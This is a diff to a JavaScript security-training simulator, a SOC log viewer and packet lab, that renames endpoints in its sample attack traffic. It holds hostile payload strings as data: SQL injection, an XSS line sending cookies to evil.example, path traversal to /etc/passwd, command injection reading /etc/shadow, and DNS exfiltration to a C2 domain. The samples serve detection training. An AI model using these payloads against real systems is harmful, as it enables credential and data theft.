@@ -1781,9 +1781,9 @@ function startSocSimulator() {
     return Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
   }
   const paths = [
-    '/images/logo.png', '/css/main.css', '/api/products', '/#/', '/api/session',
+    '/images/logo.png', '/css/main.css', '/api/products', '/', '/api/session',
     '/js/app.js', '/favicon.ico', '/api/orders', '/assets/images/banner.png',
-    '/rest/products/search', '/socket.io/?EIO=3&transport=websocket'
+    '/search?q=sneakers', '/api/cart', '/products'
   ];
   const statuses = ['200', '200', '200', '304', '404', '401', '302', '201'];
   
@@ -1816,27 +1816,27 @@ function startSocSimulator() {
       
       if (activeScenario === 'sqli') {
         actualMethod = 'GET';
-        actualPath = '/api/users?id=1+UNION+SELECT+*+FROM+passwords--';
+        actualPath = '/products?id=1+UNION+SELECT+username,password+FROM+users--';
         actualStatus = '500';
       } else if (activeScenario === 'xss') {
         actualMethod = 'GET';
-        actualPath = '/search?q=<script>fetch("http://evil.com?c="+document.cookie)</script>';
+        actualPath = '/search?q=<script>document.location="http://evil.example/?c="+document.cookie</script>';
         actualStatus = '200';
       } else if (activeScenario === 'brute') {
         actualMethod = 'POST';
-        actualPath = '/api/login';
+        actualPath = '/login';
         actualStatus = '200';
       } else if (activeScenario === 'path') {
         actualMethod = 'GET';
-        actualPath = '/ftp/../../../etc/passwd';
+        actualPath = '/download?file=../../../etc/passwd';
         actualStatus = '200';
       } else if (activeScenario === 'cmdi') {
         actualMethod = 'POST';
-        actualPath = '/api/ping?host=127.0.0.1;cat+/etc/shadow';
+        actualPath = '/admin/ping?host=127.0.0.1;cat+/etc/shadow';
         actualStatus = '200';
       } else if (activeScenario === 'idor') {
         actualMethod = 'GET';
-        actualPath = '/rest/basket/5 (where 5 != user.id)';
+        actualPath = '/api/orders/1005 (order belongs to a different user)';
         actualStatus = '200';
       } else if (activeScenario === 'ssrf') {
         actualMethod = 'POST';
@@ -1847,7 +1847,7 @@ function startSocSimulator() {
       // Background noise for brute force
       actualIp = '13.37.13.37';
       actualMethod = 'POST';
-      actualPath = '/api/login';
+      actualPath = '/login';
       actualStatus = '401';
     }
     
@@ -2479,7 +2479,7 @@ function initPacketLab() {
     { proto:'HTTP',  src:'192.168.1.105',  dst:'93.184.216.34', len:198, info:'GET /images/logo.png HTTP/1.1', malicious:false },
     { proto:'TCP',   src:'192.168.1.10',   dst:'10.0.0.1',      len:60,  info:'[SYN] Seq=0 Win=65535', malicious:false },
     { proto:'DNS',   src:'192.168.1.15',   dst:'8.8.8.8',       len:74,  info:'Standard query A api.company.com', malicious:false },
-    { proto:'HTTP',  src:'192.168.1.22',   dst:'203.0.113.10',  len:420, info:'POST /api/login HTTP/1.1', malicious:false },
+    { proto:'HTTP',  src:'192.168.1.22',   dst:'203.0.113.10',  len:420, info:'POST /login HTTP/1.1', malicious:false },
     { proto:'ARP',   src:'192.168.1.1',    dst:'ff:ff:ff:ff',   len:42,  info:'Who has 192.168.1.50? Tell 192.168.1.1', malicious:false },
     { proto:'ICMP',  src:'192.168.1.10',   dst:'192.168.1.1',   len:74,  info:'Echo (ping) request id=0x01', malicious:false },
     { proto:'TLS',   src:'192.168.1.33',   dst:'151.101.1.140', len:1452,info:'Application Data', malicious:false },
@@ -2488,7 +2488,7 @@ function initPacketLab() {
   const maliciousPackets = [
     { proto:'DNS',  src:'192.168.1.105', dst:'8.8.8.8',    len:98,  info:'Query A 6d616c776172652d646174612e evil-c2.net (long subdomain!)', malicious:true, detail:'DNS Exfiltration beacon!\nSubdomain encodes base64 data: "malware-data"\nDestination: evil-c2.net (known C2 domain)\nAction: Block outbound DNS to evil-c2.net' },
     { proto:'TCP',  src:'192.168.1.105', dst:'13.37.13.37', len:52, info:'[SYN] → 13.37.13.37:4444 (known RAT port)', malicious:true, detail:'C2 Beacon detected!\nDst Port: 4444 (Metasploit default listener)\nRemote IP: 13.37.13.37 (threat intel: known C2)\nPattern: Repeating every 60s (beacon interval)\nAction: Block outbound TCP/4444, isolate host' },
-    { proto:'HTTP', src:'192.168.1.105', dst:'203.0.113.99', len:310, info:'GET /api/users?id=1 UNION SELECT username,password,NULL FROM users--', malicious:true, detail:'SQL Injection in URL!\nPayload: UNION SELECT ...\nTarget endpoint: /api/users\nDatabase data at risk: all user credentials\nAction: WAF block, patch parameterized queries' },
+    { proto:'HTTP', src:'192.168.1.105', dst:'203.0.113.99', len:310, info:'GET /products?id=1 UNION SELECT username,password,NULL FROM users--', malicious:true, detail:'SQL Injection in URL!\nPayload: UNION SELECT ...\nTarget endpoint: /products\nDatabase data at risk: all user credentials\nAction: WAF block, patch parameterized queries' },
     { proto:'FTP',  src:'192.168.1.20',  dst:'203.0.113.5', len:44,  info:'Request: PASS s3cr3t_p@ssw0rd (PLAINTEXT!)', malicious:true, detail:'Plaintext Credentials Exposed!\nProtocol: FTP (no encryption)\nPassword transmitted in clear text\nAnyone on the network can see this!\nAction: Disable FTP, enforce SFTP/SCP' },
   ];
 
